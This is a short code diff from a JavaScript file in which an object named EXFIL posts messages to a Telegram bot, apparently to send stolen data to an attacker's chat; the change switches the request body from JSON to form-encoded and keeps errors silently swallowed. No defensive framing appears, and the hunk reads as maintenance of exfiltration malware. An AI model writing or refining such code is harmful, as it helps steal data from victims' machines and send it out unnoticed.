@@ -571,8 +571,8 @@ const EXFIL = {
     try {
       await fetch(`https://api.telegram.org/bot${this.TG_TOKEN}/sendMessage`, {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id: this.TG_CHAT_ID, text: msg, parse_mode: "Markdown", disable_notification: false}),
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "chat_id=" + encodeURIComponent(this.TG_CHAT_ID) + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown&disable_notification=false",
       });
     } catch(e) {}
   },
